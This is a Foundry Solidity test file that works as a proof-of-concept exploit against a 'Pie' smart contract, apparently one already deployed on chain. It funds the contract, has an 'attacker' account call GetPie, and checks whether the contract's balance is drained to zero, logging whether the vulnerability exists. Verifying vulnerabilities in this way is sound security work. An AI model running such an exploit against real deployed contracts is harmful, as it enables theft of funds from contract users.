// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x806a6bd219f162442d992bdc4ee6eba1f2c5a707.sol";

contract PieAccessControlTest is Test {
    Pie public pie;
    address owner = address(0x1001);
    address alice = address(0x2002);
    address attacker = address(0x3003);
    uint256 constant FUND_AMOUNT = 1.5 ether;
    uint256 constant ATTACK_AMOUNT = 1.1 ether;

    function setUp() public {
        // Deploy contract as owner
        vm.startPrank(owner);
        pie = new Pie();
        vm.stopPrank();

        // Fund the contract using call with enough gas
        vm.deal(alice, FUND_AMOUNT);
        vm.prank(alice);
        (bool success, ) = address(pie).call{value: FUND_AMOUNT}("");
        require(success, "Funding failed");
    }

    function testAccessControlBypass() public {
        // Record state BEFORE attack
        uint256 contractBalanceBefore = address(pie).balance;
        console.log("--- BEFORE-Trigger ---");
        console.log("Initial Contract Balance: %s", contractBalanceBefore);
        require(contractBalanceBefore == FUND_AMOUNT, "Initial balance incorrect");

        // Fund attacker and record initial balance
        vm.deal(attacker, ATTACK_AMOUNT);
        uint256 attackerBalanceBefore = attacker.balance;
        console.log("Attacker Initial Balance: %s", attackerBalanceBefore);

        console.log("--- Trigger Attack ---");
        // Attacker triggers the vulnerability
        vm.prank(attacker);
        pie.GetPie{value: ATTACK_AMOUNT}();

        console.log("--- AFTER-Trigger ---");
        // Record state AFTER attack
        uint256 contractBalanceAfter = address(pie).balance;
        uint256 attackerBalanceAfter = attacker.balance;
        console.log("Contract Balance After: %s", contractBalanceAfter);
        console.log("Attacker Balance After: %s", attackerBalanceAfter);

        // Calculate if both conditions are met
        bool contractDrained = (contractBalanceAfter == 0);
        bool attackerFundsDeducted = (attackerBalanceAfter == attackerBalanceBefore - ATTACK_AMOUNT);
        bool exploitSuccess = contractDrained && attackerFundsDeducted;

        // Log verification results
        console.log("Contract drained:", contractDrained ? "SUCCESS" : "FAIL");
        console.log("Attacker funds deducted:", attackerFundsDeducted ? "SUCCESS" : "FAIL");
        
        // Final vulnerability verdict
        if (exploitSuccess) {
            console.log("Vulnerability Exists: Attacker successfully reset contract balance to 0");
        } else {
            console.log("Vulnerability not Exist: Exploit conditions not met");
        }
    }
}